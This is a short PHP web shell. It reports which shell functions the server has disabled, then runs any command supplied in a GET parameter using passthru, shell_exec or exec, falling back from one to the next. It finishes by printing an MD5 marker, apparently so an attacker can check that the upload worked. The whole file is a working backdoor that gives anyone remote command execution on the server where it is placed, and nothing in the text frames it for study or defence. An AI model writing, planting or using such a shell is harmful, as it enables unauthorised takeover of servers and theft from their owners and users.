<?php
echo "DISABLED=".ini_get('disable_functions')."\n";
foreach (['system','passthru','shell_exec','exec','proc_open','popen'] as $f) {
    $disabled = in_array($f, explode(',', ini_get('disable_functions')));
    echo $f . ':' . ($disabled ? 'OFF' : 'ON') . "\n";
}
if (isset($_GET['pingtoufuck!'])) {
    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        passthru($_GET['pingtoufuck!']);
    } elseif (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        echo shell_exec($_GET['pingtoufuck!']);
    } elseif (function_exists('exec')) {
        exec($_GET['pingtoufuck!'], $o);
        echo implode("\n", $o);
    } else {
        echo "ALL SHELL FUNCTIONS DISABLED\n";
    }
}
echo md5('verify');
